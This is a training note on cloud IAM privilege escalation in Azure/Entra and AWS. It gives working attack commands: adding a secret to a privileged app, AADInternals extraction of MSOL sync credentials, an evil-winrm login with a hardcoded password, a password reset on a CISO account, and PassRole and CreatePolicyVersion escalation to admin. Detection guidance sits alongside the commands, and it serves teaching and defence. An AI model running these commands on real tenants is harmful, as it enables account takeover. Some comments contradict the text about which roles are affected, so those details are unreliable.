---
title: Cloud IAM Privilege Escalation
aliases:
  - Cloud IAM PrivEsc
  - Cloud Identity Escalation
  - PassRole Attack
tags:
  - tree/cloud
  - cyber/content
  - difficulty/practitioner
Domain:
  - "[[Cloud IAM & Identity Attacks]]"
Color: "#FABED4"
verified: 2026-09-05
---

# Cloud IAM Privilege Escalation

> [!abstract] One sentence
> Cloud IAM privilege escalation abuses over-permissive role assignments and policy APIs to pivot from a low-privilege principal to administrative control — without touching a host.

**Before you read:** You have read access to an Azure storage account in the `meridian.onmicrosoft.com` tenant as a low-privilege service principal. The Azure AD Connect server AADC01 runs at 10.10.20.36 and synchronises on-premises accounts to Entra ID. How many escalation paths exist from your current position? Hold your answer.

## Parent Learning Order
[[Cloud IAM & Identity Attacks]] → **Cloud IAM Privilege Escalation** → [[SSRF to Metadata & Credential Theft]]

---

## The IAM Model (Cross-Cloud)

Every major cloud uses the same three-part model: a **principal** (who), a **permission set** (what), and a **target resource** (where). The attack surface is any API that lets a low-privilege principal modify what a higher-privilege principal can do — or impersonate one.

| Concept | AWS | Azure | GCP |
|---|---|---|---|
| Principal | IAM user / role / instance profile | User / service principal / managed identity | Service account / user |
| Permission set | IAM policy | Role definition | IAM role / custom role |
| Assignment | Policy attachment / role assumption | Role assignment (RBAC) | Policy binding |
| Escalation API | `iam:PassRole`, `iam:CreatePolicyVersion` | `Microsoft.Authorization/roleAssignments/write` | `iam.serviceAccounts.actAs` |

---

## Azure / Entra Escalation Paths

### Path 1 — Role Assignment Write

A principal with `Microsoft.Authorization/roleAssignments/write` over any scope can grant itself or any other principal any role, including **Global Administrator** at the tenant scope.

```powershell
# Attacker holds a service principal with role-assignment write on the subscription
$sp = "attacker-sp-client-id"
$tenantId = "meridian.onmicrosoft.com"

# Grant Global Admin to attacker-controlled user
New-AzRoleAssignment `
    -ObjectId $sp `
    -RoleDefinitionName "Owner" `
    -Scope "/subscriptions/<sub-id>"
```

**Detection:** `AzureActivity` logs, operation `Microsoft.Authorization/roleAssignments/write`, actor != a known automation identity, scope = subscription or tenant.

---

### Path 2 — Application Role Escalation (App Admin)

The built-in **Application Administrator** and **Cloud Application Administrator** roles can add credentials (passwords/certs) to any service principal — including ones with higher privileges.

```powershell
# Attacker holds Application Administrator
# Target: service principal for an app with Mail.ReadWrite on all mailboxes

# Add a new secret to the high-privilege app
$app = Get-AzureADApplication -Filter "DisplayName eq 'MeridianMailSync'"
$secret = New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId

# Now authenticate as that app and call Graph API
$body = @{
    client_id     = $app.AppId
    client_secret = $secret.Value
    scope         = "https://graph.microsoft.com/.default"
    grant_type    = "client_credentials"
}
$token = (Invoke-RestMethod -Uri "https://login.microsoftonline.com/meridian.onmicrosoft.com/oauth2/v2.0/token" -Method POST -Body $body).access_token
```

> [!tip] The analogy, and where it breaks
> Application Administrator is like a key-shop employee who can cut copies of any key in the building. The shop employee has no direct access to the rooms — but they can hand a copy to the attacker.
>
> **The deliberate break:** in Azure, adding a credential to a service principal does not require consent from the service principal's owner. There is no notification. The legitimate app keeps working; the attacker now also holds credentials. This is silent.

---

### Path 3 — Azure AD Connect (AADC) Compromise → Cloud Sync Abuse

Azure AD Connect running on AADC01 (10.10.20.36) holds a privileged account (`MSOL_<hash>`) with `Directory Synchronization Accounts` permissions in Entra. This account can reset passwords for **any non-Global-Admin cloud user** and manipulate directory attributes.

```bash
# Step 1: compromise AADC01 (local admin or SYSTEM on the host)
evil-winrm -i 10.10.20.36 -u administrator -p 'Meridian2026!'

# Step 2: extract MSOL_ account credentials from AADC01
# AADInternals extracts the creds stored in the local SQL database
Import-Module AADInternals
Get-AADIntSyncCredentials  # returns UserName: MSOL_<hash>, Password: <cleartext>

# Step 3: authenticate to Entra as the MSOL account
$cred = Get-Credential  # MSOL_<hash>
Connect-MsolService -Credential $cred

# Step 4: reset Global Admin password (only works on accounts NOT protected by PIM/break-glass)
Set-MsolUserPassword -UserPrincipalName ciso@meridian.onmicrosoft.com `
    -NewPassword 'Attacker2026!' -ForceChangePassword $false
```

**Why this works:** AADC01 is an on-premises host — often underprotected relative to cloud-facing systems — but its MSOL account has cloud-wide directory write access. Lateral movement from any domain-joined host to AADC01 yields cloud Admin.

**How you'd spot it:** Entra sign-in logs showing `MSOL_<hash>` authenticating from an unexpected IP or at an unusual time; `DirectorySynchronization` audit events outside of the expected sync schedule (default: 30 min).

---

## AWS Escalation Paths

### PassRole → Admin

`iam:PassRole` allows a principal to assign an IAM role to a service (Lambda, EC2, etc.). Combined with the ability to create or invoke that service, it yields role impersonation.

```bash
# Attacker has: iam:PassRole on *, lambda:CreateFunction, lambda:InvokeFunction

# 1. Create a Lambda that calls sts:GetCallerIdentity as the admin role
aws lambda create-function   --function-name priv-check   --runtime python3.12   --role arn:aws:iam::123456789012:role/AdminRole   --handler index.handler   --zip-file fileb://function.zip

# 2. Invoke it — the Lambda now runs as AdminRole
aws lambda invoke --function-name priv-check out.json
cat out.json  # {"UserId":"AROA...","Account":"123456789012","Arn":"arn:aws:sts::123456789012:assumed-role/AdminRole/priv-check"}
```

### CreatePolicyVersion → Admin

A principal with `iam:CreatePolicyVersion` can create a new version of any customer-managed policy — including setting it as the default.

```bash
# Overwrite the policy attached to the attacker's own user with AdministratorAccess
aws iam create-policy-version   --policy-arn arn:aws:iam::123456789012:policy/LowPrivPolicy   --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'   --set-as-default
```

---

## Security Implications

- **Blast radius:** a single role-assignment write or PassRole capability escalates to the equivalent of on-premises Domain Admin — all resources in the subscription or account.
- **Persistence:** attackers add credentials to existing service principals rather than creating new ones; the legitimate app continues to function, masking the compromise.
- **Hybrid risk:** Azure AD Connect is the bridge between on-premises and cloud; its host and MSOL account are high-value targets that are often treated as on-prem assets but carry cloud-Admin privileges.

---

## Summary

- Cloud IAM escalation abuses permission-management APIs — any principal that can modify role assignments, create policy versions, or add credentials to service principals can escalate to full administrative access without exploiting a vulnerability.
- The Azure AD Connect MSOL account links on-premises lateral movement directly to cloud Global Admin; AADC01 compromise is a complete cloud kill-chain step.
- Detection relies on cloud-native audit logs (Entra audit, AWS CloudTrail, GCP Admin Activity) filtered for permission-management operations by non-automation identities outside expected patterns.

---
> 🔼 Up: [[Cloud IAM & Identity Attacks]]
